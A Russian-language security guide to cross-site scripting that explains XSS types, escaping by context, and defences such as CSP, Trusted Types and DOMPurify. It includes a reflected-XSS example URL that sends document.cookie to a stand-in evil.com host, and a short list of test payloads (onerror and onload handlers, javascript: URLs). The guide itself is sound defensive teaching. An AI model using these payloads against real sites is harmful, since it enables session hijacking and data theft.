## Суть уязвимости

**XSS (Cross-Site Scripting)** — внедрение злоумышленником собственного JavaScript в страницу, которую браузер жертвы считает легитимной. Код выполняется **в origin сайта**, то есть с полными правами пользователя.

Последствия:

- кража cookies и токенов (если нет `HttpOnly`), захват сессии;
- чтение и отправка любых данных со страницы (включая содержимое личного кабинета);
- выполнение действий от имени пользователя (перевод денег, смена пароля/почты);
- подмена интерфейса, фишинговые формы, кейлоггер;
- обход CSRF-защиты — скрипт может прочитать CSRF-токен со страницы;
- распространение (worm) через пользовательский контент.

XSS стабильно входит в OWASP Top 10 (в текущей редакции — в категории Injection).

## Виды XSS

**1. Хранимый (stored / persistent).** Полезная нагрузка сохраняется на сервере (комментарий, имя профиля, описание товара) и отдаётся всем посетителям. Самый опасный вид: не требует действий жертвы и поражает многих.

**2. Отражённый (reflected).** Нагрузка приходит в параметре запроса и сразу «отражается» в ответе:

```
https://site.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
```

Требует, чтобы жертва перешла по ссылке (фишинг, реклама, сообщение).

**3. На основе DOM (DOM-based).** Сервер вообще не участвует: уязвим клиентский код, берущий данные из `location.hash`, `location.search`, `document.referrer`, `postMessage`, `localStorage` и помещающий их в опасный «сток»:

```js
document.getElementById('out').innerHTML = location.hash.slice(1);  // уязвимо
```

Особенно актуален для SPA. Не виден в серверных логах, что затрудняет обнаружение.

**4. Mutation XSS (mXSS)** — безопасная на вид разметка мутирует при парсинге браузером и становится исполняемой; обходит наивные санитайзеры.

**5. Self-XSS** — социальная инженерия: пользователя убеждают вставить код в консоль. Не техническая уязвимость, но реальная угроза.

## Почему опасно вставлять ввод в HTML без экранирования

HTML — язык, в котором данные и код не разделены. Браузер, разбирая строку, интерпретирует специальные символы структурно: `<` начинает тег, `"` завершает атрибут, `&` начинает сущность. Если пользовательская строка попадает в разметку как есть, пользователь получает возможность **дописать разметку** — то есть перейти из «данных» в «код». Это в точности та же природа, что у SQL-инъекции.

```js
const name = '<img src=x onerror="alert(document.cookie)">';
el.innerHTML = `Привет, ${name}!`;      // код выполнится
```

Обратите внимание: `<script>`, вставленный через `innerHTML`, не выполнится, но существуют десятки других векторов — `onerror`, `onload`, `onfocus autofocus`, `<svg onload>`, `<iframe srcdoc>`, `javascript:` в `href`. Поэтому фильтрация «по чёрному списку» (запретить `<script>`) неработоспособна.

## Роль контекста

**Экранирование зависит от того, куда попадают данные.** Одна и та же строка безопасна в одном контексте и опасна в другом — это ключевая идея.

**1. Текстовое содержимое HTML.** Экранировать `& < > " '`:

```js
el.textContent = userInput;   // безопасно: браузер трактует строку как текст
```

**2. Значение атрибута.** Обязательны кавычки и экранирование кавычек. Без кавычек достаточно пробела, чтобы добавить новый атрибут:

```html
<div title=USER_INPUT>          <!-- ввод: x onmouseover=alert(1) -->
```

**3. URL в `href`/`src`.** Экранирования недостаточно — нужна **валидация схемы**: `javascript:`, `data:`, `vbscript:` должны отвергаться.

```js
const url = new URL(input, location.origin);
if (!['http:', 'https:'].includes(url.protocol)) throw new Error('bad scheme');
```

**4. Внутри `<script>`.** Вставлять данные в код нельзя. Правильный путь — сериализация с экранированием `<`, `/`:

```html
<script>const data = JSON.parse('<%= safeJsonEscape(data) %>');</script>
<!-- лучше: -->
<script type="application/json" id="data">…</script>
<script>const data = JSON.parse(document.getElementById('data').textContent);</script>
```

**5. Внутри CSS.** `url()`, `expression()` и подобные конструкции — тоже вектор.

**6. Обработчики событий в атрибутах** (`onclick="..."`) — двойной контекст (HTML + JS); безопасного экранирования практически не существует, их следует избегать.

## Защита

**1. Контекстно-зависимое экранирование по умолчанию.** Современные фреймворки (React, Vue, Angular, Svelte) экранируют вывод автоматически. Опасны только явные «люки»: `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrustHtml`, `{@html}`. Каждое их использование должно быть обосновано и сопровождаться санитизацией.

**2. `textContent` вместо `innerHTML`.** Простое правило, закрывающее большинство случаев.

**3. Санитизация HTML, когда разметка нужна** (например, WYSIWYG-редактор): **DOMPurify** с белым списком тегов и атрибутов. Никогда не писать собственный санитайзер — обходов слишком много. Появляющийся стандарт — HTML Sanitizer API (`element.setHTML()`).

**4. Content Security Policy** — второй рубеж обороны:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
```

Строгая CSP на nonce/hash запрещает инлайновые скрипты и делает большинство XSS неэксплуатируемыми. `unsafe-inline` и `unsafe-eval` сводят пользу CSP к нулю.

**5. Trusted Types** — принудительная типизация данных, попадающих в опасные стоки (`innerHTML`, `eval`, `src` скрипта); устраняет DOM XSS на уровне платформы.

**6. Cookies с `HttpOnly`, `Secure`, `SameSite`** — не предотвращают XSS, но снижают ущерб: токен нельзя прочитать из JS.

**7. Валидация на входе** (тип, длина, формат, белый список) как дополнение — но не замена экранированию на выходе.

**8. Прочее:** `rel="noopener noreferrer"` для внешних ссылок, `sandbox` у iframe, `X-Content-Type-Options: nosniff`, корректный `Content-Type` для загружаемых файлов, ограничение на загрузку HTML/SVG от пользователей.

## Проверка

Тестовые полезные нагрузки: `<img src=x onerror=alert(1)>`, `"><svg onload=alert(1)>`, `javascript:alert(1)`, `'-alert(1)-'`. Инструменты: OWASP ZAP, Burp Suite, статический анализ (`eslint-plugin-security`, semgrep), CSP-репорты (`report-uri`), баг-баунти.

---

---

## Источники

- [Cross Site Scripting (XSS) — OWASP](https://owasp.org/www-community/attacks/xss/)
- [XSS Prevention Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOM based XSS Prevention Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [Trusted Types API — MDN](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
- [Content Security Policy — MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
